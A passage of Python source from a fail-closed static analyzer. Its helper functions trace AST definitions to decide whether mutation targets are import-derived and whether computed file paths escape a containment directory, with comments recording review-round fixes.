                return False  # **kwargs splice at the call site -- can't be sure
        if arg is None:
            return False  # relies on a default / not determinable -- ambiguous
        cenv = _ContainmentEnv(ctx, ctx.scope_of(call), depth=denv.depth, helper_stack=denv.helper_stack)
        if not _containment_target_is_safe(ctx, arg, cenv, visited, depth + 1):
            return False
    return True


def _containment_def_is_safe(ctx, dd, denv, visited, depth):
    if dd.kind == "assign":
        return _containment_target_is_safe(ctx, dd.node, denv, visited, depth + 1)
    if dd.kind == "assign-unpack":
        i, n = dd.extra
        if isinstance(dd.node, (ast.Tuple, ast.List)) and len(dd.node.elts) == n and not any(
            isinstance(e, ast.Starred) for e in dd.node.elts
        ):
            return _containment_target_is_safe(ctx, dd.node.elts[i], denv, visited, depth + 1)
        return False
    if dd.kind == "param":
        return _containment_param_is_safe(ctx, dd, denv, visited, depth)
    # "for"/"for-unpack"/"with"/"with-unpack"/"aug"/"def"/"file"/"import"/"opaque":
    # none of these are further traceable to a proof of safety here -- ambiguous,
    # so the fail-closed default (not safe) applies (B-850 round 4).
    return False


def _containment_resolve_constructed_class(ctx, node, env):
    """*node* resolves -- through `_containment_resolve_value_node`'s bounded
    plain-reassignment chase -- to a call that constructs a locally-defined
    class: returns that class's ClassDef, or None when *node* isn't resolvable
    this way (an unresolved/ambiguous chain, or a callee that isn't a bare Name
    bound to exactly one in-file ClassDef -- an imported/builtin/dynamic
    constructor keeps the generic Attribute-branch fallback below) (B-850 round
    5, G5)."""
    base_node, base_env = _containment_resolve_value_node(ctx, node, env)
    if not isinstance(base_node, ast.Call) or not isinstance(base_node.func, ast.Name):
        return None
    if base_env is None:
        base_env = _ContainmentEnv(ctx, ctx.scope_of(base_node.func))
    try:
        defs = _containment_provenance_defs(base_node.func, base_env)
    except _ContainmentBudget:
        return None
    if len(defs) != 1:
        return None
    dd, _ = defs[0]
    return dd.node if dd.kind == "def" and isinstance(dd.node, ast.ClassDef) else None


def _containment_call_result_is_safe(ctx, call, env, visited, depth):
    """The `_containment_target_is_safe` Call branch's fallback once the callee
    doesn't resolve to a dotted import path (B-850 round 5, G4): a call to a
    user-defined FUNCTION in this file has its `return` expression(s) -- via
    `_containment_own_returns`, so a nested def's own `return` is never
    attributed to the outer one -- traced with the SAME ambiguous-fires
    provenance walker, sharing its depth budget; ALL of them must resolve safe
    (a bare `return` / falling off the end contributes nothing, since that
    path's result is just `None`). A call that constructs a locally-defined
    CLASS is deliberately NOT traced here -- `ast.Call` alone doesn't know which
    attribute will later be read off the instance, so that case is handled by
    the Attribute branch instead (`_containment_resolve_constructed_class` /
    `_containment_class_attr_is_safe`), which does. Anything else -- a builtin,
    an imported function, a dynamic/opaque callee, or an ambiguous in-file
    resolution -- keeps the pre-round-5 behavior (safe): this round closes the
    two callees that were resolvable but never inspected, not opaque calls in
    general (a much larger, unreviewed FP-risk surface change)."""
    if not isinstance(call.func, ast.Name):
        return True
    if env is None:
        env = _ContainmentEnv(ctx, ctx.scope_of(call.func))
    try:
        defs = _containment_provenance_defs(call.func, env)
    except _ContainmentBudget:
        return True
    if len(defs) != 1:
        return True
    dd, _ = defs[0]
    if dd.kind != "def" or not isinstance(dd.node, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return True
    fn = dd.node
    returns = [r.value for r in _containment_own_returns(fn) if r.value is not None]
    if not returns:
        return True
    fenv = _ContainmentEnv(ctx, fn, depth=env.depth, helper_stack=env.helper_stack)
    fenv.hops = env.hops
    return all(_containment_target_is_safe(ctx, r, fenv, visited, depth + 1) for r in returns)


def _containment_target_is_safe(ctx, node, env=None, visited=None, depth=0):
    """True only when *node* is PROVABLY never import/sensitive-derived -- the
    exemption side of the round-4 fail-closed flip (C-135 rejection of
    e4041ebb: a resolution-based guard that can't positively PROVE a target
    sensitive was silently exempting it -- backwards for something called
    fail-closed). Anything this can't fully trace to a safe origin (a parameter
    with no discoverable call site, an opaque def, budget exhaustion, an
    unresolvable container/subscript, ...) returns False -- the guard fires on
    an ambiguous target, not just a proven-sensitive one. `self`/an ordinary
    local whose whole reachable definition chain never touches an import stays
    exempt (protects the FP1-FP11 self.path=p / setattr(self, k, v) family from
    B-850 round 3): the distinguishing signal is whether the VALUE being
    assigned is import-derived, never the attribute/variable's own name."""
    if depth > _CONTAINMENT_PROVENANCE_MAX_DEPTH:
        return False
    if node is None:
        return True
    if visited is None:
        visited = set()
    key = id(node)
    if key in visited:
        return False
    visited = visited | {key}

    # Try FULL resolution first: a proven-sensitive dotted name is not safe; any
    # OTHER fully-resolved dotted name (e.g. a plain `import json; j = json`) is
    # conclusively safe outright, no further structural walk needed.
    resolved = _containment_resolve_through_assigns(ctx, node, env)
    if resolved is not None:
        return not _containment_dotted_is_sensitive(resolved)

    if isinstance(node, _CONTAINMENT_TRIVIALLY_SAFE_TYPES):
        return True
    if isinstance(node, ast.Name):
        if node.id in ("True", "False", "None"):
            return True
        if _containment_is_receiver_param(ctx, node):
            return True
        if env is None:
            env = _ContainmentEnv(ctx, ctx.scope_of(node))
        try:
            defs = _containment_provenance_defs(node, env)
        except _ContainmentBudget:
            return False
        if not defs:
            return False
        return all(_containment_def_is_safe(ctx, dd, denv, visited, depth) for dd, denv in defs)
    if isinstance(node, ast.Attribute):
        if isinstance(node.value, ast.Name) and _containment_is_receiver_param(ctx, node.value):
            return _containment_self_attr_is_safe(ctx, node, env, visited, depth)
        # B-850 round 5 (G5): before falling back to "is the WHOLE base object
        # safe" (which discards *which* attribute is being read), check whether
        # the base resolves to a traced constructor call for a locally-defined
        # class -- if so, use that class's own per-attribute safety, the exact
        # same check `self.<attr>` gets from inside the class.
        class_node = _containment_resolve_constructed_class(ctx, node.value, env)
        if class_node is not None:
            return _containment_class_attr_is_safe(ctx, class_node, node.attr)
        return _containment_target_is_safe(ctx, node.value, env, visited, depth + 1)
    if isinstance(node, ast.Dict):
        return all(
            _containment_target_is_safe(ctx, v, env, visited, depth + 1)
            for v in node.values if v is not None
        )
    if isinstance(node, (ast.List, ast.Tuple, ast.Set)):
        return all(_containment_target_is_safe(ctx, e, env, visited, depth + 1) for e in node.elts)
    if isinstance(node, (ast.Subscript, ast.Starred)):
        return _containment_target_is_safe(ctx, node.value, env, visited, depth + 1)
    if isinstance(node, ast.Call):
        # A call result is safe unless its OWN callee resolves to a sensitive
        # dotted name (e.g. `pathlib.Path(...)`); an ordinary constructor/helper
        # call whose callee isn't itself import-sensitive is presumed to build an
        # ordinary local value, not a live alias into a sensitive namespace --
        # narrower than the general ambiguous-fires rule, to keep the very common
        # "parameter holds a constructed object" shape from becoming a new FP
        # surface (functools.partial(setattr, ...) is caught earlier and more
        # precisely by `_containment_partial_setattr_target`, not here).
        callee_d = _containment_resolve_through_assigns(ctx, node.func, env)
        if callee_d is not None:
            return not _containment_dotted_is_sensitive(callee_d)
        # B-850 round 5 (G4): an UNRESOLVED callee used to be waved through as
        # safe unconditionally -- correct for a genuinely opaque callee (a
        # builtin, an imported function, a dynamic call: still safe, unchanged
        # below), but wrong for a callee that IS resolvable because it's a
        # function/class defined right here in the file -- trace it instead.
        return _containment_call_result_is_safe(ctx, node, env, visited, depth)
    return False


def _containment_mutation_base_is_risky(ctx, node, env=None):
    """Fail-closed combinator for a mutation TARGET's base object (B-850 round 4,
    C-135 rejection of e4041ebb): fires when `_containment_sensitive_base` can
    positively resolve it to a sensitive namespace, OR when it can't be PROVEN
    safe either -- flips the prior fail-open default on an unresolvable target
    (H1/H2/H5) while `_containment_target_is_safe`'s receiver/self-attr/
    call-site handling keeps the FP1-FP11 family exempt."""
    if _containment_sensitive_base(ctx, node, env):
        return True
    return not _containment_target_is_safe(ctx, node, env)


def _containment_callsite_args(fn, pname, denv, visited):
    """Evaluate the argument every in-file call site passes for *pname*. Only ever ADDS
    alternatives to the always-present runtime one, so it can raise a verdict to ESCAPES
    (a literal call site that walks out) but never lower one."""
    if not isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)) or fn in denv.helper_stack:
        return []
    a = fn.args
    names = [p.arg for p in a.posonlyargs + a.args]
    out = []
    for call in _containment_callsites(fn, denv.ctx)[:_CONTAINMENT_MAX_CALLSITES]:
        arg = None
        if pname in names and names.index(pname) < len(call.args):
            arg = call.args[names.index(pname)]
            if isinstance(arg, ast.Starred) or any(
                isinstance(x, ast.Starred) for x in call.args[:names.index(pname)]
            ):
                continue
        for kw in call.keywords:
            if kw.arg == pname:
                arg = kw.value
        if arg is None:
            continue
        cenv = _ContainmentEnv(denv.ctx, denv.ctx.scope_of(call), helper_stack=denv.helper_stack + (fn,))
        cenv.hops = denv.hops
        out += _containment_ev(arg, cenv, visited)
    return out


def _containment_resolve_name(node, env, visited):
    alts = []
    for d, denv in _containment_lookup(node, env, visited):
        alts += _containment_eval_def(d, denv, visited, node.id)
    if not alts:
        return [_ContainmentOpq("runtime", f"unbound name '{node.id}'")]
    return _containment_dedupe(alts)


def _containment_concat(a, b):
    if isinstance(a, _ContainmentStr) and isinstance(b, _ContainmentStr):
        return _ContainmentStr(a.s + b.s)
    pa = a.pieces if isinstance(a, _ContainmentCat) else (a,)
    pb = b.pieces if isinstance(b, _ContainmentCat) else (b,)
    return _ContainmentCat(pa + pb)


def _containment_is_callee_chain_node(ctx, n):
    """True if Attribute *n* is itself a `Call.func`, or an INTERMEDIATE link of a
    longer dotted `Call.func` chain (e.g. the `urllib.parse` inside `urllib.parse.
    unquote(...)`'s own callee) -- walks up through consecutive Attribute parents to
    the chain's actual use site (B-850 round 3, staticness fix)."""
    cur = n
    while True:
        par = ctx.parent.get(cur)
        if isinstance(par, ast.Attribute) and par.value is cur:
            cur = par
            continue
        return isinstance(par, ast.Call) and par.func is cur


def _containment_staticness(node, env, visited, depth=0):
    """'static' when every free input is a literal (module constants / builtins as
    callees are fine); 'runtime' when anything comes from a parameter, env, I/O."""
    if depth > 8:
        return "runtime"
    for n in ast.walk(node):
        if isinstance(n, (ast.Lambda, ast.ListComp, ast.GeneratorExp, ast.SetComp, ast.DictComp)):
            return "runtime"
        if isinstance(n, ast.Call):
            # B-850 round 2/3: a call in `_CONTAINMENT_PURE_FUNCS` never disqualifies
            # (its own arguments are still checked on their own turn in this same
            # walk). A call in `_CONTAINMENT_IMPURE_CALLS`, or ANY resolvable call
            # taking zero arguments (an environment-probe shape, e.g. `platform.
            # system()`/`os.getcwd()`) always does -- these read HOST state that isn't
            # determined by the call's own (possibly-literal) inputs. Any OTHER
            # resolvable call (`''.join`'s `reversed(...)`, `bytes(...)`, `str(...)`,
            # `urllib.parse.unquote(...)`, `json.loads(...)`, `operator.add(...)`,
            # `textwrap.dedent(...)`, ...) does NOT disqualify by itself -- it is just
            # as foldable-in-principle as a PURE_FUNCS decoder when its own arguments
            # are literal, and round 2's blanket "not in PURE_FUNCS -> runtime" rule
            # wrongly downgraded that whole family from the correct static/ESCAPES
            # verdict to a bare runtime/UNPROVEN one (D1-D8). A call whose callee does
            # NOT dotted-resolve at all -- a method call on a computed receiver, e.g.
            # the `.decode()` in `base64.b64decode(x).decode()` -- is left alone here
            # either way; the base64 call itself is still checked on its own turn.
            cd = env.ctx.canon_func(n.func, env)
            if cd is not None and cd not in _CONTAINMENT_PURE_FUNCS:
                if cd in _CONTAINMENT_IMPURE_CALLS or not n.args:
                    return "runtime"
        if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load):
            if n.id == "__file__":
                return "runtime"
            if env.ctx.dotted(n, env) is not None and n.id not in env.ctx.rd(env.scope).local_names:
                continue  # import-bound module / builtin
            for d, denv in _containment_lookup(n, env, visited):
                if d.kind == "import":
                    continue
                if d.kind != "assign" or _containment_staticness(d.node, denv, visited, depth + 1) != "static":
                    return "runtime"
            if not _containment_lookup(n, env, visited):
                return "runtime"
        if isinstance(n, ast.Attribute):
            if n.attr in ("environ", "argv", "stdin"):
                return "runtime"
            # B-850 round 3: any OTHER resolvable module/class attribute READ (sys.
            # platform, sys.version_info, os.name, ...) is ordinary runtime state, not
            # a literal -- mirrors `_containment_attribute`'s own already-correct
            # handling of the SAME shape (round 2), which this function does not see
            # since it is reached from a DIFFERENT caller (an f-string conversion/
            # format-spec, or a Subscript fallback like `sys.version_info[0]`) that
            # never goes through `_containment_attribute` at all (closes FP23/FP24). A
            # bare CALLEE reference (`os.path.join` as `Call.func`, OR an intermediate
            # link of one -- `urllib.parse` inside `urllib.parse.unquote(...)`'s own
            # dotted `Call.func` chain) is excluded -- that is graded by the Call check
            # above, not by being an Attribute.
            if n.attr != "parent" and not _containment_is_callee_chain_node(env.ctx, n):
                d = env.ctx.canon_func(n, env)
                if d is not None:
                    is_os_const = any(
                        d.startswith(mod) and d[len(mod):] in _CONTAINMENT_OS_CONSTS
                        for mod in ("os.", "os.path.")
                    )
                    if not is_os_const and d not in ("sys._MEIPASS", "sys.frozen"):
                        return "runtime"
    return "static"


def _containment_opaque(node, env, visited, why):
    return [_ContainmentOpq(_containment_staticness(node, env, visited), why)]


def _containment_ev(node, env, visited=frozenset()):
    env.depth += 1
    try:
        if env.depth > _CONTAINMENT_MAX_EVAL_DEPTH:
            raise _ContainmentBudget("expression depth")
        return _containment_dedupe(_containment_ev_dispatch(node, env, visited))
    finally:
        env.depth -= 1


def _containment_ev_dispatch(node, env, visited):  # noqa: C901 -- one recognizer dispatch, see module comment
    if isinstance(node, ast.Constant):
        if isinstance(node.value, str):
            return [_ContainmentStr(node.value)]
        if isinstance(node.value, bytes):
            return [_ContainmentStr(node.value.decode("latin-1"))]
        return [_ContainmentOpq("static", "non-string constant")]
    if isinstance(node, ast.JoinedStr):
        parts = []
        for v in node.values:
            if isinstance(v, ast.Constant):
                parts.append([_ContainmentStr(str(v.value))])
            elif isinstance(v, ast.FormattedValue):
                if v.conversion not in (-1, ord("s")) or v.format_spec is not None:
                    parts.append(_containment_opaque(v.value, env, visited, "formatted with a spec/conversion"))
                else:
                    parts.append(_containment_ev(v.value, env, visited))
        out = []
        for combo in _containment_product(parts):
            acc = _ContainmentStr("")
            for c in combo:
                acc = _containment_concat(acc, c)
            out.append(acc)
        return out
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        return [_containment_concat(a, b) for a, b in _containment_product(
            [_containment_ev(node.left, env, visited), _containment_ev(node.right, env, visited)]
        )]
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Mod):
        return _containment_percent(node, env, visited)
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Div):
        return [_containment_join(list(c), "pathlib") for c in _containment_product(
            [_containment_ev(node.left, env, visited), _containment_ev(node.right, env, visited)]
        )]
    if isinstance(node, ast.NamedExpr):
        return _containment_ev(node.value, env, visited)
    if isinstance(node, ast.Name):
        return _containment_resolve_name(node, env, visited)
    if isinstance(node, (ast.List, ast.Tuple)):
        if any(isinstance(e, ast.Starred) for e in node.elts):
            return [_ContainmentOpq("runtime", "starred sequence")]
        return [_ContainmentSeq(tuple(tuple(_containment_ev(e, env, visited)) for e in node.elts))]
    if isinstance(node, ast.IfExp):
        if isinstance(node.test, ast.Constant):
            return _containment_ev(node.body if node.test.value else node.orelse, env, visited)
        return _containment_ev(node.body, env, visited) + _containment_ev(node.orelse, env, visited)
    if isinstance(node, ast.BoolOp):
        # `a or b` yields the first truthy operand, `a and b` the first falsy one (else
        # the last). Truthiness is only claimed where it is certain: a non-empty literal,
        # or an anchored path (absolute __file__ -> never ''). Anything else: both flow.
        out = []
        last = len(node.values) - 1
        for i, v in enumerate(node.values):
            alts = _containment_ev(v, env, visited)
            if i == last:
                return out + alts

            def truthy(a):
                if isinstance(a, _ContainmentStr):
                    return bool(a.s)
                if isinstance(a, _ContainmentPV) and a.root == "anchor":
                    return True
                return None

            t = [truthy(a) for a in alts]
            if isinstance(node.op, ast.Or):
                out += [a for a, tv in zip(alts, t) if tv is not False]
                if all(tv is True for tv in t):
                    return out
            else:
                out += [a for a, tv in zip(alts, t) if tv is not True]
                if all(tv is False for tv in t):
                    return out
        return out
    if isinstance(node, ast.Attribute):
        return _containment_attribute(node, env, visited)
    if isinstance(node, ast.Subscript):
        return _containment_subscript(node, env, visited)
    if isinstance(node, ast.Call):
        return _containment_call(node, env, visited)
    return _containment_opaque(node, env, visited, f"unrecognized {type(node).__name__}")


def _containment_percent(node, env, visited):
    fmts = _containment_ev(node.left, env, visited)
    if not all(isinstance(f, _ContainmentStr) for f in fmts):
        return _containment_opaque(node, env, visited, "%-format with a computed format")
    if isinstance(node.right, ast.Tuple):
        args = [_containment_ev(e, env, visited) for e in node.right.elts]
    elif isinstance(node.right, ast.Dict):
        return _containment_opaque(node, env, visited, "%-format with a mapping")
    else:
        args = [_containment_ev(node.right, env, visited)]
    out = []
    for f in fmts:
        toks = re.split(r"(%%|%[sd])", f.s)
        n_ph = sum(1 for t in toks if t in ("%s", "%d"))
        if n_ph != len(args) or re.search(r"%[^sd%]", f.s.replace("%%", "")):
            out += _containment_opaque(node, env, visited, "%-format shape not modelled")
            continue
        for combo in _containment_product(args):
            acc, k = _ContainmentStr(""), 0
            for t in toks:
                if t in ("%s", "%d"):
                    acc = _containment_concat(acc, combo[k])
                    k += 1
                elif t == "%%":
                    acc = _containment_concat(acc, _ContainmentStr("%"))
                else:
                    acc = _containment_concat(acc, _ContainmentStr(t))
            out.append(acc)
    return out


def _containment_attribute(node, env, visited):
    ctx = env.ctx
    d = ctx.canon_func(node, env)
    if d:
        for mod in ("os.", "os.path."):
            if d.startswith(mod) and d[len(mod):] in _CONTAINMENT_OS_CONSTS:
                return [_ContainmentStr(_CONTAINMENT_OS_CONSTS[d[len(mod):]])]
        if d in ("sys._MEIPASS", "sys.frozen"):
            # a non-frozen interpreter raises AttributeError here: no value flows on.
            return [] if not ctx.sys_mutated else [_ContainmentOpq("runtime", d)]
    if node.attr == "parent":
        return [_containment_dirname(v, "pathlib") for v in _containment_ev(node.value, env, visited)]
    if d is not None:
        # B-850 round 2: any OTHER import-bound module attribute (sys.platform,
        # os.name, ...) is ordinary runtime state, not a literal -- was previously
        # folded to 'static' by default and then read as an obfuscated escape.
        return [_ContainmentOpq("runtime", f"attribute {d}")]
    return _containment_opaque(node, env, visited, f"attribute .{node.attr}")


def _containment_env_var_root(key_node):
    """`abs` pv for a literal env-var *key* that is absolute-by-construction (HOME,
    TMPDIR, PWD, XDG_*, ...); None otherwise (the caller falls back to an ordinary
    runtime unknown)."""
    if isinstance(key_node, ast.Constant) and isinstance(key_node.value, str):
        k = key_node.value
        if k in _CONTAINMENT_ABS_ENV_VARS or k.startswith("XDG_"):
            return _containment_pv("abs", why=f"{k} environment variable (absolute by construction)")
    return None


def _containment_env_get(key_node, default_node, env, visited):
    """`os.getenv(key[, default])` / `os.environ.get(key[, default])`: the value is
    EITHER whatever the runtime environment holds -- an absolute-path source when
    *key* is a known absolute-by-construction variable, an ordinary runtime unknown
    otherwise -- OR, if the variable is unset, the literal *default* (B-850 round 2:
    previously folded to a single 'static' opaque, which could wrongly convict an
    ordinary safe default as an obfuscated escape, or wrongly exempt a HOME/TMPDIR
    read as a merely-UNPROVEN anchored one)."""
    runtime = _containment_env_var_root(key_node) or _ContainmentOpq(
        "runtime", f"{ast.unparse(key_node)[:30]} environment variable"
    )
    out = [runtime]
    if default_node is not None:
        out += _containment_ev(default_node, env, visited)
    return out


def _containment_subscript(node, env, visited):
    ctx = env.ctx
    idx = node.slice
    if idx.__class__.__name__ == "Index":   # Python <=3.8 subscript wrapper compat
        idx = idx.value
    const_int = isinstance(idx, ast.Constant) and isinstance(idx.value, int) and not isinstance(
        idx.value, bool)
    base = node.value
    if ctx.canon_func(base, env) == "os.environ":
        return [_containment_env_var_root(idx) or _ContainmentOpq(
            "runtime", f"os.environ[{ast.unparse(idx)[:30]}]"
        )]
    if isinstance(base, ast.Attribute) and base.attr == "parents" and const_int and idx.value >= 0:
        out = []
        for v in _containment_ev(base.value, env, visited):
            for _ in range(idx.value + 1):
                v = _containment_dirname(v, "pathlib")
            out.append(v)
        return out
    if isinstance(base, ast.Call) and const_int and ctx.canon_func(base.func, env) == "os.path.split" \
            and len(base.args) == 1:
        if idx.value == 0:
            return [_containment_dirname(v, "os") for v in _containment_ev(base.args[0], env, visited)]
        return _containment_opaque(node, env, visited, "os.path.split()[1]")
    if const_int:
        out = []
        for v in _containment_ev(base, env, visited):
            if isinstance(v, _ContainmentSeq) and -len(v.elts) <= idx.value < len(v.elts):
                out += list(v.elts[idx.value])
            else:
                return _containment_opaque(node, env, visited, "subscript")
        return out
    return _containment_opaque(node, env, visited, "subscript/slice")


def _containment_expand_args(call, env, visited):
    """Positional operands with *starred sequences spliced in. Returns a list of
    alternative operand-lists."""
    per = []   # list of (list of alternative operand-tuples)
    for a in call.args:
        if isinstance(a, ast.Starred):
            alts = []
            for v in _containment_ev(a.value, env, visited):
                if isinstance(v, _ContainmentSeq):
                    alts += [tuple(c) for c in _containment_product(list(v.elts))]
                else:
                    alts.append((_ContainmentOpq("runtime", "starred non-literal"),))
            per.append(alts)
        else:
            per.append([(v,) for v in _containment_ev(a, env, visited)])
    out = []
    for combo in _containment_product(per):
        flat = []
        for part in combo:
            flat += list(part)
        out.append(flat)
    return out


def _containment_call(node, env, visited):  # noqa: C901 -- one recognizer dispatch, see module comment
    ctx = env.ctx
    f = node.func
    d = ctx.canon_func(f, env)
    nargs = len(node.args)
    if d == "os.path.join" and nargs and not node.keywords:
        return [_containment_join(ops, "os") for ops in _containment_expand_args(node, env, visited)]
    if d in ("os.getenv", "os.environ.get") and 1 <= nargs <= 2 and not node.keywords:
        return _containment_env_get(
            node.args[0], node.args[1] if nargs == 2 else None, env, visited
        )
    if d == "os.path.dirname" and nargs == 1:
        return [_containment_dirname(v, "os") for v in _containment_ev(node.args[0], env, visited)]
    if d in ("os.path.abspath", "os.path.realpath") and nargs == 1:
        return [_containment_normalize(v, True) for v in _containment_ev(node.args[0], env, visited)]
    if d == "os.path.normpath" and nargs == 1:
        return [_containment_normalize(v, False) for v in _containment_ev(node.args[0], env, visited)]
    if d == "os.path.expanduser" and nargs == 1:
        return [_containment_expanduser(v) for v in _containment_ev(node.args[0], env, visited)]
    if d in ("os.fspath", "builtins.str") and nargs == 1 and not node.keywords:
        return _containment_ev(node.args[0], env, visited)
    if d == "os.getcwd" and nargs == 0:
        return [_containment_pv("cwd", why="os.getcwd()")]
    if d and d.startswith("pathlib.") and d.split(".")[-1] in _CONTAINMENT_PATHLIB_CLASSES:
        if nargs == 0:
            return [_containment_pv("rel", why="Path()")]
        if nargs == 1 and not isinstance(node.args[0], ast.Starred):
            return [_containment_join([v], "pathlib") for v in _containment_ev(node.args[0], env, visited)]
        return [_containment_join(ops, "pathlib") for ops in _containment_expand_args(node, env, visited)]
    if d and d.startswith("pathlib.") and d.endswith((".cwd", ".home")):
        return [_containment_pv("cwd" if d.endswith(".cwd") else "home", why=d)]
    if d == "builtins.getattr" and nargs == 3 and isinstance(node.args[1], ast.Constant) and \
            node.args[1].value in ("_MEIPASS",) and ctx.dotted(node.args[0], env) == "sys":
        # PyInstaller idiom: in a non-frozen interpreter the default is what flows.
        if not ctx.sys_mutated:
            return _containment_ev(node.args[2], env, visited)
        return _containment_ev(node.args[2], env, visited) + [
            _ContainmentOpq("runtime", "sys._MEIPASS (sys is mutated)")
        ]
    if isinstance(f, ast.Attribute):
        m = f.attr
        recv = f.value
        if m == "joinpath":
            recv_alts = _containment_ev(recv, env, visited)
            return [_containment_join([r] + ops, "pathlib") for r in recv_alts
                    for ops in _containment_expand_args(node, env, visited)]
        if m in ("resolve", "absolute") and not node.args:
            return [_containment_normalize(v, True) for v in _containment_ev(recv, env, visited)]
        if m == "expanduser" and not node.args:
            return [_containment_expanduser(v) for v in _containment_ev(recv, env, visited)]
        if m in ("as_posix", "__fspath__") and not node.args:
            return _containment_ev(recv, env, visited)
        if m in ("with_name", "with_suffix", "with_stem") and nargs == 1:
            out = []
            for r in _containment_ev(recv, env, visited):
                for a in _containment_ev(node.args[0], env, visited):
                    rp = _containment_as_path(r)
                    if m == "with_name" and isinstance(a, _ContainmentStr) and a.s == "..":
                        # B-850 round 2: with_name('..') is an up-motion, not a same-
                        # level rename -- push a real '..' component so
                        # _containment_verdict's depth counter sees it (GLUE would
                        # hide it behind an ordinary-rename marker instead).
                        out.append(_containment_push(_containment_pop(rp), [".."]))
                    elif isinstance(a, _ContainmentStr) and "/" not in a.s and "\\" not in a.s and rp.comps:
                        out.append(_containment_push(_containment_pop(rp), [_CONTAINMENT_GLUE]))
                    else:
                        out.append(_containment_push(_containment_pop(rp), [_CONTAINMENT_UNK], unk=True))
            return out
        if m in ("iterdir",) and not node.args:
            return [_containment_push(_containment_as_path(r), [_CONTAINMENT_SAFE_MARK])
                    for r in _containment_ev(recv, env, visited)]
        # pure str methods on literal receivers fold (e.g. '/'.join([...]), '..'.replace)
        recv_alts = _containment_ev(recv, env, visited)
        if recv_alts and all(isinstance(r, _ContainmentStr) for r in recv_alts):
            if m == "join" and nargs == 1:
                out = []
                for r in recv_alts:
                    for it in _containment_ev(node.args[0], env, visited):
                        if isinstance(it, _ContainmentSeq):
                            for combo in _containment_product(list(it.elts)):
                                acc = _ContainmentStr("")
                                for i, c in enumerate(combo):
                                    acc = _containment_concat(acc, _ContainmentStr(r.s) if i else _ContainmentStr(""))
                                    acc = _containment_concat(acc, c)
                                out.append(acc)
                        else:
                            out += _containment_opaque(node, env, visited, "str.join over a computed iterable")
                return out
            if m == "format" and not node.keywords and not any(isinstance(a, ast.Starred) for a in node.args):
                out = []
                argv = [_containment_ev(a, env, visited) for a in node.args]
                for r in recv_alts:
                    toks = re.split(r"(\{\d*\})", r.s)
                    if any(("{" in t or "}" in t) and not re.fullmatch(r"\{\d*\}", t)
                           for t in toks if t):
                        out += _containment_opaque(node, env, visited, "str.format field not modelled")
                        continue
                    for combo in _containment_product(argv):
                        acc, auto = _ContainmentStr(""), 0
                        bad = False
                        for t in toks:
                            if re.fullmatch(r"\{\d*\}", t):
                                i = int(t[1:-1]) if t[1:-1] else auto
                                auto += 1
                                if i >= len(combo):
                                    bad = True
                                    break
                                acc = _containment_concat(acc, combo[i])
                            elif t:
                                acc = _containment_concat(acc, _ContainmentStr(t))
                        out += _containment_opaque(node, env, visited, "format index") if bad else [acc]
                return out
            if m in _CONTAINMENT_FOLDABLE_STR_METHODS or m == "decode":
                out = []
                for combo in _containment_product(
                    [recv_alts] + [_containment_ev(a, env, visited) for a in node.args]
                ):
                    if all(isinstance(c, _ContainmentStr) for c in combo) and not node.keywords:
                        try:
                            if m == "decode":
                                val = combo[0].s
                            else:
                                val = getattr(combo[0].s, m)(*[c.s for c in combo[1:]])
                            if isinstance(val, str):
                                out.append(_ContainmentStr(val))
                                continue
                        except Exception:  # noqa: BLE001
                            pass
                    out += _containment_opaque(node, env, visited, f"str.{m} not foldable")
                return out
    # local helper function -> inline its return value(s) (positively recognized only)
    if isinstance(f, ast.Name):
        inl = _containment_inline(node, env, visited)
        if inl is not None:
            return inl
    return _containment_opaque(node, env, visited, f"unrecognized call {ast.unparse(f)[:40]}")


def _containment_inline(call, env, visited):
    defs = _containment_lookup(call.func, env, visited)
    if len(defs) != 1 or defs[0][0].kind != "def":
        return None
    fn = defs[0][0].node
    if not isinstance(fn, ast.FunctionDef) or fn.decorator_list or fn in env.helper_stack:
        return None
    if len(env.helper_stack) >= _CONTAINMENT_MAX_HELPER_DEPTH:
        return None
    a = fn.args
    if a.vararg or a.kwarg or a.kwonlyargs or a.posonlyargs:
        return None
    if any(isinstance(x, ast.Starred) for x in call.args) or any(k.arg is None for k in call.keywords):
        return None
    for n in ast.walk(fn):
        if isinstance(n, (ast.Yield, ast.YieldFrom, ast.Global, ast.Nonlocal)):
            return None
    names = [p.arg for p in a.args]
    if len(call.args) > len(names):
        return None
    bound = dict(zip(names, [(x, env) for x in call.args]))
    for kw in call.keywords:
        if kw.arg not in names or kw.arg in bound:
            return None
        bound[kw.arg] = (kw.value, env)
    defenv = _ContainmentEnv(env.ctx, env.ctx.scope_of(fn))
    for i, p in enumerate(names):
        if p not in bound:
            j = i - (len(names) - len(a.defaults))
            if j < 0:
                return None
            bound[p] = (a.defaults[j], defenv)
    henv = _ContainmentEnv(
        env.ctx, fn, params=bound, depth=env.depth, helper_stack=env.helper_stack + (fn,)
    )
    henv.hops = env.hops
    rets = [n for n in _ContainmentReachingDefs._own_nodes(None, fn.body) if isinstance(n, ast.Return)]
    if not rets or any(r.value is None for r in rets):
        return None
    out = []
    for r in rets:
        out += _containment_ev(r.value, henv, visited)
    return out


def _containment_ev_iter(it, env, visited):
    """Element values of a `for` loop's iterable."""
    ctx = env.ctx
    if isinstance(it, (ast.List, ast.Tuple, ast.Set)):
        out = []
        for e in it.elts:
            if isinstance(e, ast.Starred):
                return [_ContainmentOpq("runtime", "starred loop element")]
            out += _containment_ev(e, env, visited)
        return out
    if isinstance(it, ast.Call):
        d = ctx.canon_func(it.func, env)
        if d in ("builtins.sorted", "builtins.reversed", "builtins.list", "builtins.tuple",
                 "builtins.set", "builtins.frozenset") and len(it.args) == 1:
            return _containment_ev_iter(it.args[0], env, visited)
        if d == "os.listdir":
            return [_ContainmentSafe()]           # names only: no separator, never '.' or '..'
        if d in ("glob.glob", "glob.iglob") and len(it.args) == 1:
            return _containment_ev(it.args[0], env, visited)
        if isinstance(it.func, ast.Attribute) and it.func.attr in ("glob", "rglob") and \
                len(it.args) == 1:
            out = []
            for r in _containment_ev(it.func.value, env, visited):
                for p in _containment_ev(it.args[0], env, visited):
                    j = _containment_join([r, p], "pathlib")
                    out.append(_containment_push(j, [_CONTAINMENT_SAFE_MARK]) if it.func.attr == "rglob" else j)
            return out
        if isinstance(it.func, ast.Attribute) and it.func.attr == "iterdir" and not it.args:
